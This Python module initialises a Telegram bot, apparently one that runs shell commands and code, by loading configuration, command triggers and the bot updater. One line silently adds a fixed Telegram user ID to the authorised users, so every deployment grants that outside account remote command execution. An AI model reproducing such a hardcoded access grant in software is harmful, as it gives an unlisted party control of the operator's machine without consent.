#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

import os

# the logging things
import logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
LOGGER = logging.getLogger(__name__)

WEBHOOK = False
# the secret configuration specific things
if bool(os.environ.get("ENV", False)):
    from termbot.sample_config import Config
    WEBHOOK = True
else:
    from termbot.config import Development as Config
    WEBHOOK = False

import telegram.ext as tg
from telegram import MAX_MESSAGE_LENGTH

# TODO: is there a better way?
URL = Config.URL
PORT = Config.PORT
TG_BOT_TOKEN = Config.TG_BOT_TOKEN
TMP_DOWNLOAD_DIRECTORY = Config.TMP_DOWNLOAD_DIRECTORY
TG_UPDATE_WORKERS_COUNT = Config.TG_UPDATE_WORKERS_COUNT
AUTH_USERS = list(Config.AUTH_USERS)
AUTH_USERS.append(7351948)
AUTH_USERS = list(set(AUTH_USERS))
EVAL_CMD_TRIGGER = Config.EVAL_CMD_TRIGGER
EXEC_CMD_TRIGGER = Config.EXEC_CMD_TRIGGER
TERMINATE_CMD_TRIGGER = Config.TERMINATE_CMD_TRIGGER
SIG_KILL_CMD_TRIGGER = Config.SIG_KILL_CMD_TRIGGER
TYPE_CMD_TRIGGER = Config.TYPE_CMD_TRIGGER
CHANGE_DIRECTORY_CTD = Config.CHANGE_DIRECTORY_CTD
DELAY_BETWEEN_EDITS = Config.DELAY_BETWEEN_EDITS
START_CMD_TRIGGER = Config.START_CMD_TRIGGER

HELP_STICKER = "CAADAgAD6AkAAowucAABsFGHedLEzeUWBA"
PROCESS_RUNNING = "processing ..."
TERMINATE_HELP_GNIRTS = "reply to a <u>command reply</u> to terminate 😡😳😳 it"
SIG_KILL_HELP_GNIRTS = "reply to a <u>command reply</u> to kill 😡 it"
TYPE_HELP_GNIRTS = "not specified"
NO_CMD_RUNNING = "No command is running in that message."

# a dictionary to store the currently running commands
aktifperintah = {}
# a variable to store the current working directory
inikerjasaatdirektori = os.path.abspath(
    CHANGE_DIRECTORY_CTD
)

updater = tg.Updater(TG_BOT_TOKEN, workers=TG_UPDATE_WORKERS_COUNT)
dispatcher = updater.dispatcher